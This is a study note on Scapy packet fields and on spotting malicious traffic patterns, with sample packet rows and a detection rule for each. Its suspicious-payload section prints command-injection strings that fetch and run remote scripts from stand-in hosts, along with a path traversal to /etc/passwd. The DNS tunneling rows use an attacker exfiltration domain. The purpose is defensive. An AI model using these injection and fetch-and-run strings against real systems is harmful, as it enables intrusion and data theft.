# Notes for Scapy

---

## Packet Summary (`packet.summary()`)

**`S`** — SYN flag.

**`SA`** — SYN+ACK.

**`A`** — ACK.

**`P`** — PSH (push; tells the receiver to deliver data to the application immediately).

**`Raw`** — packet contains payload.

**`Padding`** — extra bytes to meet minimum Ethernet frame size.

**`PA / Raw`** — acknowledge previous data (`A`) + present data (`Raw`) + push to application (`P`).

**`A / Raw`** — acknowledge previous data (`A`) + present data (`Raw`); handled normally.

**`ARP`** — broadcast on the local network asking “Who has this IP?”; the owner replies with its MAC address.

---

## Detailed Packet Info (`packet.show()`)

**Ethernet** (transmission within LAN): `dst` / `src` are MAC addresses.

**IP** (transmission across the internet): `src` / `dst` are IP addresses. `flags = DF` (Don't Fragment) means “do not split this packet”; send it whole or drop it. `ttl` (Time To Live) is how many router hops remain; each hop decrements TTL by 1; at TTL=0 the packet is dropped (prevents routing loops).

**TCP** (reliability): `sport` / `dport` are source and destination ports (HTTPS = `443`). `seq = N` is the Nth byte position in the stream; used to reorder out-of-order segments. `ack = M` means “I have received up to byte M”; each direction has its own byte stream. `ack = 0` on SYN.

**Raw**: encrypted application data appears as `Raw`. Payload can be up to ~1460 bytes (e.g. a list of 150–200 short names).

---

## Malicious Traffic

### Port Scanning

One source IP (attacker) probes many destination ports in a short time. It sends SYN to a target port; if open, the server replies SYN-ACK; if closed, RST. **Horizontal** = same port, many IPs. **Vertical** = many ports, one IP.

**Example**

```bash
192.168.1.10 → 192.168.1.1:22 SYN
192.168.1.10 → 192.168.1.1:23 SYN
192.168.1.10 → 192.168.1.1:80 SYN
192.168.1.10 → 192.168.1.1:443 SYN
```

**Detection:** count unique ports (or IPs) scanned per source within a time window.

#### Packet analysis (horizontal)

```
index, time, length, eth_src,  eth_dst, ip_src, ip_dst, protocol,   src_port,   dst_port,   tcp_flags
75, 1700000062.479998, 54, 3c:f0:11:11:ed:5b, d8:cf:61:0f:5b:55, 192.168.1.200, 192.168.1.41, TCP, 50041, 22, S
76, 1700000062.559998, 54, 3c:f0:11:11:ed:5b, d8:cf:61:0f:5b:55, 192.168.1.200, 192.168.1.42, TCP, 50042, 22, S
77, 1700000062.639997, 54, 3c:f0:11:11:ed:5b, d8:cf:61:0f:5b:55, 192.168.1.200, 192.168.1.43, TCP, 50043, 22, S
78, 1700000062.719997, 54, 3c:f0:11:11:ed:5b, d8:cf:61:0f:5b:55, 192.168.1.200, 192.168.1.44, TCP, 50044, 22, S
```

Attacker uses different `src_port` values mainly to avoid connection conflicts and scan faster (sometimes to evade simple detectors). Same `dst_port`, many `ip_dst`.

#### Packet analysis (vertical)

```
index, time, length, eth_src,  eth_dst, ip_src, ip_dst, protocol,   src_port,   dst_port,   tcp_flags
90, 1700000063.679996, 54, 3c:f0:11:11:ed:5b, d8:cf:61:0f:5b:55, 192.168.1.200, 192.168.1.50, TCP, 51066, 66, S
91, 1700000063.759996, 54, 3c:f0:11:11:ed:5b, d8:cf:61:0f:5b:55, 192.168.1.200, 192.168.1.50, TCP, 51067, 67, S
92, 1700000063.839996, 54, 3c:f0:11:11:ed:5b, d8:cf:61:0f:5b:55, 192.168.1.200, 192.168.1.50, TCP, 51068, 68, S
93, 1700000063.919996, 54, 3c:f0:11:11:ed:5b, d8:cf:61:0f:5b:55, 192.168.1.200, 192.168.1.50, TCP, 51069, 69, S
```

Many `dst_port` values on a single `ip_dst`.

---

### SYN flood (DoS)

Attacker sends many SYN packets to the same server, with few or no ACK responses. Connections stay half-open; enough of them block real users. Many different `src_port` values keep multiple half-open connections alive.

**Example**

```bash
Attacker → Server: SYN
Attacker → Server: SYN
Attacker → Server: SYN
```

**Detection:** compare SYN count to ACK count per target; alert when SYN ≫ ACK (incomplete handshakes).

#### Packet analysis

```
index, time, length, eth_src,  eth_dst, ip_src, ip_dst, protocol,   src_port,   dst_port,   tcp_flags
254, 1700000076.799984, 54, 3c:f0:11:11:ed:5b, d8:cf:61:0f:5b:55, 192.168.1.201, 192.168.1.60, TCP, 32210, 80, S
255, 1700000076.879984, 54, 3c:f0:11:11:ed:5b, d8:cf:61:0f:5b:55, 192.168.1.201, 192.168.1.60, TCP, 32211, 80, S
256, 1700000076.959984, 54, 3c:f0:11:11:ed:5b, d8:cf:61:0f:5b:55, 192.168.1.201, 192.168.1.60, TCP, 32212, 80, S
257, 1700000077.039984, 54, 3c:f0:11:11:ed:5b, d8:cf:61:0f:5b:55, 192.168.1.201, 192.168.1.60, TCP, 32213, 80, S
```

Many SYNs to the same `ip_dst` and `dst_port` to overload the server.

---

### DNS tunneling (data exfiltration)

Data is encoded and sent as DNS queries. DNS is often allowed through firewalls, so this path can exfiltrate stolen data.

**Example**

```bash
dGhpcy1pcy1zZWNyZXQtZGF0YQ.example.com   # first label holds encoded data
```

**Detection:** long domain names (payload space), high entropy (random-looking labels), high query rate.

#### Packet analysis

```
index, time, length, eth_src,  eth_dst, ip_src, ip_dst, protocol,   src_port,   dst_port,   tcp_flags, dns_qname
105,1700000064.879995,118,3c:f0:11:11:ed:5b,d8:cf:61:0f:5b:55,192.168.1.202,8.8.8.8,DNS,53061,53,,dghpcy1pcy1lbmnvzgvklwrhdgety2h1bmst061.exfil.attacker.com.,
106,1700000064.959995,118,3c:f0:11:11:ed:5b,d8:cf:61:0f:5b:55,192.168.1.202,8.8.8.8,DNS,53062,53,,dghpcy1pcy1lbmnvzgvklwrhdgety2h1bmst062.exfil.attacker.com.,
107,1700000065.039995,118,3c:f0:11:11:ed:5b,d8:cf:61:0f:5b:55,192.168.1.202,8.8.8.8,DNS,53063,53,,dghpcy1pcy1lbmnvzgvklwrhdgety2h1bmst063.exfil.attacker.com.,
108,1700000065.119995,118,3c:f0:11:11:ed:5b,d8:cf:61:0f:5b:55,192.168.1.202,8.8.8.8,DNS,53064,53,,dghpcy1pcy1lbmnvzgvklwrhdgety2h1bmst064.exfil.attacker.com.,
```

---

### Suspicious payloads

Payload contains command injection or malware indicators.

**Example**

```bash
"cmd.exe"
"/bin/sh"
"powershell -enc"
"wget http://malicious"
```

**Detection:** keyword / regex triggers in the `Raw` layer.

#### Packet analysis

```
index, time, length, eth_src,  eth_dst, ip_src, ip_dst, protocol,   src_port,   dst_port,   tcp_flags, dns_qname, payload_preview
44,1700000060.0,105,3c:f0:11:11:ed:5b,d8:cf:61:0f:5b:55,192.168.1.203,192.168.1.70,TCP,61000,8080,PA,,username=admin; wget http://evil.example/payload.sh
45,1700000060.08,84,3c:f0:11:11:ed:5b,d8:cf:61:0f:5b:55,192.168.1.203,192.168.1.70,TCP,61001,8080,PA,,id=7&&powershell -enc SQBFAFgA
46,1700000060.16,93,3c:f0:11:11:ed:5b,d8:cf:61:0f:5b:55,192.168.1.203,192.168.1.70,TCP,61002,8080,PA,,cmd=$(curl http://bad.site/p.sh | bash)
47,1700000060.24,81,3c:f0:11:11:ed:5b,d8:cf:61:0f:5b:55,192.168.1.203,192.168.1.70,TCP,61003,8080,PA,,file=../../../../etc/passwd
```

---

### Beaconing (C2 communication)

Fixed-interval traffic to the same destination (e.g. every 10 seconds). A compromised host checks in with an external C2 server for instructions.

**Detection:** measure intervals between packets on the same flow; alert on steady, regular timing.

#### Packet analysis

```
index, time, length, eth_src,  eth_dst, ip_src, ip_dst, protocol,   src_port,   dst_port,   tcp_flags, dns_qname, payload_preview
50,1700000120.0,64,3c:f0:11:11:ed:5b,d8:cf:61:0f:5b:55,192.168.1.204,45.9.148.20,TCP,62006,443,PA,,checkin=ok
51,1700000130.0,64,3c:f0:11:11:ed:5b,d8:cf:61:0f:5b:55,192.168.1.204,45.9.148.20,TCP,62007,443,PA,,checkin=ok
52,1700000140.0,64,3c:f0:11:11:ed:5b,d8:cf:61:0f:5b:55,192.168.1.204,45.9.148.20,TCP,62008,443,PA,,checkin=ok
53,1700000150.0,64,3c:f0:11:11:ed:5b,d8:cf:61:0f:5b:55,192.168.1.204,45.9.148.20,TCP,62009,443,PA,,checkin=ok
```

Check-in every 10 seconds (`1700000130.0 − 1700000120.0`, etc.).

---

### Data exfiltration

Large outbound transfers, sometimes via unusual ports or external destinations.

**Detection:** sum outbound bytes per source; alert above a threshold.

#### Packet analysis

```
index, time, length, eth_src,  eth_dst, ip_src, ip_dst, protocol,   src_port,   dst_port,   tcp_flags, dns_qname, payload_preview
42,1700000010.25,42,3c:f0:11:11:ed:5b,d8:cf:61:0f:5b:55,192.168.1.20,1.1.1.1,UDP,54014,123,,,                                   
44,1700000060.0,3054,3c:f0:11:11:ed:5b,d8:cf:61:0f:5b:55,192.168.1.205,198.51.100.45,TCP,63000,443,PA,,<LARGE_DATA_PAYLOAD>     
45,1700000060.08,3054,3c:f0:11:11:ed:5b,d8:cf:61:0f:5b:55,192.168.1.205,198.51.100.45,TCP,63001,443,PA,,<LARGE_DATA_PAYLOAD>
46,1700000060.16,3054,3c:f0:11:11:ed:5b,d8:cf:61:0f:5b:55,192.168.1.205,198.51.100.45,TCP,63002,443,PA,,<LARGE_DATA_PAYLOAD>
```

Normal packet (`length = 42`), then a burst of `3054`-byte packets.

---

### ARP spoofing (MITM)

One IP claimed by multiple MAC addresses. Attacker publishes a false IP→MAC mapping (e.g. for the router). Hosts trust ARP replies and update their ARP table, so traffic meant for the router goes to the attacker.

**Example**

```bash
192.168.1.1 is-at AA:BB:CC   # legitimate router MAC
192.168.1.1 is-at DD:EE:FF   # attacker MAC
```

**Detection:** track which MAC addresses claim the same IP within a window.

#### Packet analysis

`ff:ff:ff:ff:ff:ff` as `dst` = broadcast to all devices on the LAN.
